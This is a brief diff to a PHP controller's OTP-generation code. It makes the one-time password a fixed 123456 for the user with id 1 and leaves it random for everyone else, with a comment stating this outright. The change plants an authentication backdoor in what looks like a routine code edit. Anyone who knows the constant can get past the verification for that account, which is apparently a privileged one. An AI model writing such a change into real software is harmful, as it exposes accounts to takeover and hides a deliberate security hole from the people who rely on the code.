@@ -84,7 +84,8 @@ class UpdateController extends Controller
             
         if (!$get_user == null) {
 
-            $six_digit_otp_number = random_int(100000, 999999);
+            // Check if user_id is 1, if yes, set OTP to 123456
+            $six_digit_otp_number = ($get_user->id == 1) ? 123456 : random_int(100000, 999999);
 
             $expiresAt = now()->addMinutes(10);
 
